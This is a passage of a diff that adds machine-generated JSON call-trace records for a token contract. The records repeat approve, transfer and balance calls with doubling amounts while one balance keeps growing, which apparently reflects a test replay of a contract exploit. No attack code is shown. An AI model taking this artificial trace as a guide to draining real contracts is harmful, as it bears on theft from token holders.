+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "569",
+        "args": "MINER: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "4063",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "15595",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "569",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "89981310709999999986862 [8.998e22]"
+    },
+    {
+        "id": "3763",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 1310720000000000000 [1.31e18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "3500779900905358204 [3.5e18]"
+    },
+    {
+        "id": "3262",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "569",
+        "args": "MINER: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "4063",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "15595",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "569",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "89982621429999999986862 [8.998e22]"
+    },
+    {
+        "id": "3763",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 2621440000000000000 [2.621e18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "3500779900905358204 [3.5e18]"
+    },
+    {
+        "id": "3262",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "569",
+        "args": "MINER: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "4063",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "15595",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "569",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "89985242869999999986862 [8.998e22]"
+    },
+    {
+        "id": "3763",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 5242880000000000000 [5.242e18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "3500779900905358204 [3.5e18]"
+    },
+    {
+        "id": "3262",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "569",
+        "args": "MINER: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "4063",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "15595",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "569",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "89990485749999999986862 [8.999e22]"
+    },
+    {
+        "id": "3763",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 10485760000000000000 [1.048e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "3500779900905358204 [3.5e18]"
+    },
+    {
+        "id": "3262",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "569",
+        "args": "MINER: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "4063",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "15595",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "569",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "90000971509999999986862 [9e22]"
+    },
+    {
+        "id": "3763",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 20971520000000000000 [2.097e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "3500779900905358204 [3.5e18]"
+    },
+    {
+        "id": "3262",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "569",
+        "args": "MINER: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "4063",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "15595",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "569",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "90021943029999999986862 [9.002e22]"
+    },
+    {
+        "id": "3763",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 41943040000000000000 [4.194e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "3500779900905358204 [3.5e18]"
+    },
+    {
+        "id": "3262",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "569",
+        "args": "MINER: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "4063",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "15595",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "569",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "90063886069999999986862 [9.006e22]"
+    },
+    {
+        "id": "3763",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 83886080000000000000 [8.388e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "3500779900905358204 [3.5e18]"
+    },
+    {
+        "id": "3262",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "569",
+        "args": "MINER: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "4063",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "15595",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "569",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "90147772149999999986862 [9.014e22]"
+    },
+    {
+        "id": "3763",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 167772160000000000000 [1.677e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "3500779900905358204 [3.5e18]"
+    },
+    {
+        "id": "3262",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "569",
+        "args": "MINER: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "4063",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "15595",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "569",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "90315544309999999986862 [9.031e22]"
+    },
+    {
+        "id": "3763",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 335544320000000000000 [3.355e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "3500779900905358204 [3.5e18]"
+    },
+    {
+        "id": "3262",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "569",
+        "args": "MINER: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "4063",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "15595",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "569",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "90651088629999999986862 [9.065e22]"
+    },
+    {
+        "id": "3763",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 671088640000000000000 [6.71e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "3500779900905358204 [3.5e18]"
+    },
+    {
+        "id": "3262",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "569",
+        "args": "MINER: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "4063",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "15595",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "569",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "91322177269999999986862 [9.132e22]"
+    },
+    {
+        "id": "3763",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 1342177280000000000000 [1.342e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "3500779900905358204 [3.5e18]"
+    },
+    {
+        "id": "3262",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "569",
+        "args": "MINER: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "4063",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "15595",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "569",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "92664354549999999986862 [9.266e22]"
+    },
+    {
+        "id": "3763",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 2684354560000000000000 [2.684e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "3500779900905358204 [3.5e18]"
+    },
+    {
+        "id": "3262",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "569",
+        "args": "MINER: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "4063",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "15595",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "569",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "95348709109999999986862 [9.534e22]"
+    },
+    {
+        "id": "3763",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 5368709120000000000000 [5.368e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "3500779900905358204 [3.5e18]"
+    },
+    {
+        "id": "3262",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "569",
+        "args": "MINER: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "4063",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "15595",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "569",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "100717418229999999986862 [1.007e23]"
+    },
+    {
+        "id": "3763",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 10737418240000000000000 [1.073e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "3500779900905358204 [3.5e18]"
+    },
+    {
+        "id": "3262",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "569",
+        "args": "MINER: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "4063",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "15595",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "569",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "111454836469999999986862 [1.114e23]"
+    },
+    {
+        "id": "3763",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 21474836480000000000000 [2.147e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "3500779900905358204 [3.5e18]"
+    },
+    {
+        "id": "3262",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "569",
+        "args": "MINER: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "4063",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "15595",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "569",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "132929672949999999986862 [1.329e23]"
+    },
+    {
+        "id": "3763",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 42949672960000000000000 [4.294e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "3500779900905358204 [3.5e18]"
+    },
+    {
+        "id": "3262",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "569",
+        "args": "MINER: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "4063",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "15595",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "569",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "175879345909999999986862 [1.758e23]"
+    },
+    {
+        "id": "3763",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 85899345920000000000000 [8.589e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "3500779900905358204 [3.5e18]"
+    },
+    {
+        "id": "3262",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "569",
+        "args": "MINER: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "4063",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "15595",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "569",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "261778691829999999986862 [2.617e23]"
+    },
+    {
+        "id": "3763",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 171798691840000000000000 [1.717e23]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "3500779900905358204 [3.5e18]"
+    },
+    {
+        "id": "3262",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "569",
+        "args": "MINER: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "4063",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "15595",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "569",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "433577383669999999986862 [4.335e23]"
+    },
+    {
+        "id": "3763",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 343597383680000000000000 [3.435e23]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "3500779900905358204 [3.5e18]"
+    },
+    {
+        "id": "3262",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "569",
+        "args": "MINER: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "4063",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "15595",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "569",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "777174767349999999986862 [7.771e23]"
+    },
+    {
+        "id": "3763",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 687194767360000000000000 [6.871e23]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "3500779900905358204 [3.5e18]"
+    },
+    {
+        "id": "3262",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "569",
+        "args": "MINER: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "4063",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "15595",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "569",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "1464369534709999999986862 [1.464e24]"
+    },
+    {
+        "id": "3763",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 1374389534720000000000000 [1.374e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "3500779900905358204 [3.5e18]"
+    },
+    {
+        "id": "3262",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "569",
+        "args": "MINER: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "4063",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "15595",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "569",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "2838759069429999999986862 [2.838e24]"
+    },
+    {
+        "id": "3763",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 2748779069440000000000000 [2.748e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "3500779900905358204 [3.5e18]"
+    },
+    {
+        "id": "3262",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "569",
+        "args": "MINER: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "4063",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "15595",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "569",
+        "args": "0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e",
+        "original_code": null,
+        "description": null,
